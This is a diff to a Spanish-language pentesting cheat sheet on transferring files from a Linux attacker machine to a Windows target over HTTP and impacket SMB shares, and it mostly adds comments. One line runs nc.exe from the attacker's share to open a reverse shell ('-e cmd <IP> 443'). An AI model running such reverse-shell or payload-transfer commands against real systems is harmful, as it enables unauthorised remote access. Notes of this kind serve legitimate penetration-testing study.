@@ -15,7 +15,7 @@ C:\Windows\Temp
 # Atacante Linux
 2. ❯ python -m SimpleHTTPServer 80      # Creamos un servidor para poder pasar los archivos a la maquina Windows
 3. ❯ python3 -m http.server 80          # Creamos un servidor 
-4. ❯ impacket-smbserver smbFolder --smb2support
+4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un server para tranferir el archivo a Windows
 5. ❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un server para tranferir el archivo a Windows compartiendo el dir actual con 'pwd'
 ```
 
@@ -32,7 +32,7 @@ C:\Windows\Temp
 	# IP = Direccion de la maquina de atacante Linux
 	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
 
-4. \\\\<IP>\smbFolder\nc.exe -e cmd <IP> 443 
+4. \\\\<IP>\smbFolder\nc.exe -e cmd <IP> 443        # Ejecutas una revershell con el binario 'Netcat'
  
 5. ❯ copy \\❮IP❯\smbFolder\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante
 
